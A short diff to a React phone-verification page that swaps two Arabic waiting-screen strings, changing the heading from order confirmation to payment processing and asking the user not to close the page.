@@ -270,13 +270,13 @@ export default function VerifyPhonePage() {
               </div>
             </div>
 
-            <h1 className="erd-wait-heading">جار تأكيد الطلب</h1>
+            <h1 className="erd-wait-heading">جار معالجة عملية الدفع</h1>
             <div className="erd-wait-divider" aria-hidden="true">
               <i className="erd-wait-divider-line" />
               <div className="erd-wait-dots"><b /><b /><b /></div>
               <i className="erd-wait-divider-line" />
             </div>
-            <p className="erd-wait-message">يرجى الانتظار حتى اكتمال تأكيد الطلب، ويمكنك متابعة حالة طلبك بعد ذلك</p>
+            <p className="erd-wait-message">يرجى الانتظار وعدم اغلاق هذه الصفحة حتى اكتمال العمليه</p>
           </>
         ) : (
           <>
